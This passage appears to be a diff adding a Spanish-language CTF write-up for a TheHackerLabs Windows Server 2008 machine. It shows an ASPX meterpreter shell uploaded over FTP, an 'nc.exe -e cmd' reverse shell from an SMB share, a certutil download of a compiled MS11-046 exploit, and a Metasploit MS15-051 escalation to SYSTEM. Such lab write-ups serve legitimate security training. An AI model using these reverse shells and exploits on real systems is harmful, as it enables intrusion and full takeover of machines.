+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">5555</span>
+</span></span><span style="display:flex;"><span>resource <span style="color:#f92672">(</span>handler.rc<span style="color:#f92672">)</span>&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>PAYLOAD <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>resource <span style="color:#f92672">(</span>handler.rc<span style="color:#f92672">)</span>&gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444
+</span></span></code></pre></div><p>Vamos a cargar nuestra <strong>Reverse Shell</strong> al <strong>FTP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; binary
+</span></span><span style="display:flex;"><span>200 Type set to I.
+</span></span><span style="display:flex;"><span>ftp&gt; put meterpreterShell.aspx 
+</span></span><span style="display:flex;"><span>local: meterpreterShell.aspx remote: meterpreterShell.aspx
+</span></span><span style="display:flex;"><span>227 Entering Passive Mode (192,168,1,80).
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>100% |*********************************************|  2867       20.25 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span><span style="display:flex;"><span>2867 bytes sent in 00:00 (65.27 KiB/s)
+</span></span></code></pre></div><p>Ya solamente entramos en nuestro archivo desde la página web:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura7.png">
+</p>
+<p>Y ya tendremos nuestra sesión de <strong>meterpreter</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">177734</span> bytes<span style="color:#f92672">)</span> to 192.168.1.80
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>Tu_IP:4444 -&gt; 192.168.1.80:49187<span style="color:#f92672">)</span> at 2025-02-03 21:30:19 -0600
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>ervicio de red
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : WIN-JG67MIHZH2X
+</span></span><span style="display:flex;"><span>OS              : Windows Server <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>6.0 Build 6001, Service Pack 1<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x86
+</span></span><span style="display:flex;"><span>System Language : es_ES
+</span></span><span style="display:flex;"><span>Domain          : WORKGROUP
+</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Meterpreter     : x86/windows
+</span></span></code></pre></div><h4 id="BinNC2">Ejecutando Binario nc.exe desde Recurso Compartido de SMB para Obtener Sesión</h4>
+<p>Como mencione antes, dentro de nuestro Kali, tenemos ya un binario de <strong>netcat</strong> que sirve con <strong>Windows</strong>.</p>
+<p>Búscala y cópiala en tu directorio actual de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate nc.exe
+</span></span><span style="display:flex;"><span>/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+</span></span><span style="display:flex;"><span>/usr/share/windows-resources/binaries/nc.exe
+</span></span></code></pre></div><p>Desde tu directorio actual de trabajo, vamos a levantar el <strong>servicio SMB</strong> para que podamos usar el <strong>binario nc.exe</strong> desde la <strong>WebShell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-smbserver smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><p>Usa <strong>rlwrap</strong> en conjunto con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Por último, vamos a usar nuestro <strong>Servicio SMB</strong> para poder usar remotamente el <strong>binario nc.exe</strong> y mandar una conexión hacia nuestra máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>\\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP 443
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura8.png">
+</p>
+<p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rlwrap nc -nlvp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [Tu_IP] from (UNKNOWN) [192.168.1.80] 49160
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 6.0.6001]
+</span></span><span style="display:flex;"><span>Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>c:\windows\system32\inetsrv<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\servicio de red
+</span></span></code></pre></div><p>Ya solo podemos obtener la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>c:\windows\system32\inetsrv<span style="color:#75715e">&gt;cd C:\Users\info</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> C:\Users\info
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>C:\Users\info<span style="color:#75715e">&gt;type user.txt</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="EnumWin">Enumeración de Máquina Windows</h3>
+<p>Veamos qué privilegios tiene nuestro usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Temp<span style="color:#75715e">&gt;whoami /priv</span>
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>INFORMACI�N DE PRIVILEGIOS
+</span></span><span style="display:flex;"><span>--------------------------
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Nombre de privilegio          Descripci�n                                       Estado       
+</span></span><span style="display:flex;"><span>============================= ================================================= =============
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Reemplazar un s�mbolo (token) de nivel de proceso Deshabilitado
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
+</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generar auditor�as de seguridad                   Deshabilitado
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido                  Habilitada   
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n      Habilitada   
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
+</span></span></code></pre></div><p>Podríamos usar <strong>JuicyPotato</strong>, pero no funcionará, ya que solo sirve para <strong>arquitecturas x64</strong>.</p>
+<p>Tenemos varías opciones para enumerar de forma automatizada como:</p>
+<ul>
+<li><a href="https://github.com/rasta-mouse/Watson/tree/master" target="_blank">Repositorio de rasta-mouse: Watson</a></li>
+<li><a href="https://github.com/bitsadmin/wesng" target="_blank">Repositorio de bitsadmin: Windows Exploit Suggester - Next Generation (WES-NG)</a></li>
+<li>Módulo <code>post/multi/recon/local_exploit_suggester</code> de <strong>Metasploit</strong>.</li>
+</ul>
+<p>Pero en mi caso no funcionaron la mayoría.</p>
+<p>Entonces, obtengamos la información de la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Temp<span style="color:#75715e">&gt;systeminfo</span>
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nombre de host:                            WIN-JG67MIHZH2X
+</span></span><span style="display:flex;"><span>Nombre del sistema operativo:              Microsoft� Windows Server� 2008 Datacenter 
+</span></span><span style="display:flex;"><span>Versi�n del sistema operativo:             6.0.6001 Service Pack 1 Compilaci�n 6001
+</span></span><span style="display:flex;"><span>Fabricante del sistema operativo:          Microsoft Corporation
+</span></span><span style="display:flex;"><span>Configuraci�n del sistema operativo:       Servidor independiente
+</span></span><span style="display:flex;"><span>Tipo de compilaci�n del sistema operativo: Multiprocessor Free
+</span></span><span style="display:flex;"><span>Propiedad de:                              Usuario de Windows
+</span></span><span style="display:flex;"><span>Organizaci�n registrada:                   
+</span></span><span style="display:flex;"><span>Id. del producto:                          92577-082-2500446-76907
+</span></span><span style="display:flex;"><span>Fecha de instalaci�n original:             14/06/2024, 12:21:47
+</span></span><span style="display:flex;"><span>Tiempo de arranque del sistema:            04/02/2025, 5:19:51
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Vamos a buscar un Exploit para la versión de Windows que muestra: <strong>Microsoft Windows Server 2008 Datacenter</strong>.</p>
+<p>Y encontramos estos dos:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/40564" target="_blank">Microsoft Windows (x86) - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-046)</a></li>
+<li><a href="https://www.exploit-db.com/exploits/39719" target="_blank">Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)</a></li>
+</ul>
+<p>Como no podemos usar <strong>PowerShell</strong>, vamos a usar la primera opción.</p>
+<h3 id="PostExp">Probando Exploit: Microsoft Windows (x86) - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-046)</h3>
+<p>La podemos encontrar dentro de Kali:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit MS11-046
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                              |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;afd.sys&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>MS11-046<span style="color:#f92672">)</span>                                                                                   | windows_x86/local/40564.c
+</span></span><span style="display:flex;"><span>Microsoft Windows - <span style="color:#e6db74">&#39;afd.sys&#39;</span> Local Kernel <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>MS11-046<span style="color:#f92672">)</span>                                                                                                 | windows/dos/18755.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><p>Usamos la primer opción.</p>
+<p>Copiamos el Exploit en nuestro directorio de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m windows_x86/local/40564.c
+</span></span><span style="display:flex;"><span>  Exploit: Microsoft Windows <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;afd.sys&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>MS11-046<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/40564
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
+</span></span><span style="display:flex;"><span>    Codes: CVE-2011-1249, MS11-046
+</span></span><span style="display:flex;"><span> Verified: True
+</span></span><span style="display:flex;"><span>File Type: C source, ASCII text
+</span></span></code></pre></div><p>Analizando el Exploit, nos menciona que debemos compilarlo para obtener el binario que usaremos para escalar privilegios.</p>
+<p>Compilamos el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+</span></span></code></pre></div><p>Ya solo es cuestión de mandarlo a la máquina víctima.</p>
+<p>Abre un servidor con <strong>Python</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Usaremos <strong>certutil.exe</strong> para descargar el Exploit en la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Temp<span style="color:#75715e">&gt;certutil.exe -split -urlcache -f http://Tu_IP/MS11-046.exe</span>
+</span></span><span style="display:flex;"><span>certutil.exe -split -urlcache -f http://Tu_IP/MS11-046.exe
+</span></span><span style="display:flex;"><span>****  En l�nea  ****
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache comando completado correctamente.
+</span></span></code></pre></div><p>Y lo ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Temp<span style="color:#75715e">&gt;MS11-046.exe</span>
+</span></span><span style="display:flex;"><span>MS11-046.exe
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>c:\Windows\System32<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Listo, ya somos el <strong>usuario administrador</strong>.</p>
+<h3 id="PostExp2">Probando Exploit: Microsoft Windows - ClientCopyImage Win32k (MS15-051) (Metasploit)</h3>
+<p>En este caso, vamos a usar el módulo <code>post/multi/recon/local_exploit_suggester</code> para aprovechar que tenemos una sesión de <strong>meterpreter</strong>.</p>
+<p>Vamos a configurarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; use post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Lo ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.80 - Collecting local exploits <span style="color:#66d9ef">for</span> x86/windows...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.80 - <span style="color:#ae81ff">203</span> exploit checks are being tried...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.80 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Windows Windows Server <span style="color:#ae81ff">2008</span> build detected!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.80 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.80 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.80 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.80 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.80 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running check method <span style="color:#66d9ef">for</span> exploit <span style="color:#ae81ff">42</span> / <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.1.80 - Valid modules <span style="color:#66d9ef">for</span> session 1:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#   Name                                                           Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span> -   ----                                                           -----------------------  ------------
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Windows Windows Server <span style="color:#ae81ff">2008</span> build detected!
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Tenemos varias opciones, pero el que sirve para escalar privilegios es el módulo <code>exploit/windows/local/ms15_051_client_copy_image</code>.</p>
+<p>Vamos a configurarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; use exploit/windows/local/ms15_051_client_copy_image
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms15_051_client_copy_image<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Y lo ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms15_051_client_copy_image<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the exploit DLL and executing it...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching msiexec to host the DLL...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Process <span style="color:#ae81ff">1460</span> launched.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 1460...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit finished, wait <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>hopefully privileged<span style="color:#f92672">)</span> payload execution to complete.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">177734</span> bytes<span style="color:#f92672">)</span> to 192.168.1.80
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>Tu_IP:4444 -&gt; 192.168.1.80:49188<span style="color:#f92672">)</span> at 2025-02-03 21:34:00 -0600
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><p>De esta forma, volvimos a escalar privilegios.</p>
+<p>Ya solo obtenemos la flag del administrador:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Windows\System32<span style="color:#75715e">&gt;cd C:\Users\Administrador\Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> C:\Users\Administrador\Desktop
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> El volumen de la unidad C no tiene etiqueta.
+</span></span><span style="display:flex;"><span> El n�mero de serie del volumen es: 1CEF-5C5A
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span> Directorio de C:\Users\Administrador\Desktop
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>14/06/2024  17:17    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>14/06/2024  17:17    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>14/06/2024  17:16                29 root.txt
+</span></span><span style="display:flex;"><span>               1 archivos             29 bytes
+</span></span><span style="display:flex;"><span>               2 dirs  12.669.628.416 bytes libres
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
+</span></span></code></pre></div><p>Y con esto, completamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener noreferrer">https://github.com/bitsadmin/wesng</a></li><li><a href="https://github.com/rasta-mouse/Watson/tree/master" target="_blank" rel="noopener noreferrer">https://github.com/rasta-mouse/Watson/tree/master</a></li><li><a href="https://www.exploit-db.com/exploits/39719" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/39719</a></li><li><a href="https://www.exploit-db.com/exploits/40564" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/40564</a></li><li><a href="https://www.exploit-db.com/exploits/37367" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/37367</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-mortadela/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Mortadela - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-shined/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Shined - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
